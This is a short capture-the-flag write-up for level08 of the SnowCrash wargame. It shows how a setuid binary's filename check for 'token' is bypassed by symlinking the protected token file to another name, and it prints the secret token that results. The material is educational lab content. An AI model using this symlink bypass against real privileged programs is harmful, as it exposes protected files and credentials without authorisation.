`ls -l` </br>
```-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08``` </br>
```-rw-------  1 flag08 flag08    26 Mar  5  2016 token```

level08 seems to print the content of the file given as the first argument, however we can't read token:
```You may not access 'token'```

If we do a `strings` on the level08 binary, we can see that the programs calls strstr and that 'token' is hard written in the code.
Maybe it won't read anyfile with 'token' in the name. 

`level08@SnowCrash:~$ ./level08 /tmp/cctoken`</br>
`You may not access '/tmp/cctoken'`</br>

How to make it access and read token through a file not named 'token'?

https://techterms.com/definition/symbolic_link

We can use symbolic links: </br>

`ln -s ~/token /tmp/non` </br>
`./level08 /tmp/non` </br>
gives `quif5eloekouj29ke0vouxean`
